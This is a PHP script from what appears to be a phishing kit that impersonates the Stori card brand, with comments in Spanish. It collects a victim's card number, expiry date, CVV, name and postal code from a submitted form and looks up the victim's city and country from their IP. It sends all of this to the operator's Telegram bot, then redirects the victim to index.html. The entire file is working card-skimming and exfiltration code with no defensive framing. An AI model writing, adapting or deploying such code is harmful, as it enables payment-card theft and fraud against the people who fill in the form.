<?php
include 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $numero   = $_POST['card_number'] ?? 'N/A';
    $expira   = $_POST['expiry_date'] ?? 'N/A';
    $cvv      = $_POST['cvv'] ?? 'N/A';
    $nombre   = $_POST['name'] ?? 'N/A';
    $postal   = $_POST['postal_code'] ?? 'N/A';
    $ip       = $_SERVER['REMOTE_ADDR'];
    $hora     = date('Y-m-d H:i:s');

    // Ubicación por IP
    $ipInfo = @json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    $ciudad = $ipInfo->city ?? 'Desconocida';
    $region = $ipInfo->region ?? '';
    $pais   = $ipInfo->country ?? '';

    $mensaje = "
💳 <b>DATOS DE TARJETA STORI</b>

📇 <b>Número:</b> <code>$numero</code>
📅 <b>Expira:</b> <code>$expira</code>
🔒 <b>CVV:</b> <code>$cvv</code>
👤 <b>Nombre:</b> $nombre
📍 <b>CP:</b> $postal

🌐 <b>IP:</b> <code>$ip</code>
🏙️ <b>Ubicación:</b> $ciudad, $region ($pais)
🕒 <b>Hora:</b> $hora
";

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    file_get_contents($url . '?' . http_build_query($data));

    header('Location: index.html'); // Cambia a lo que necesites
    exit;
}
?>
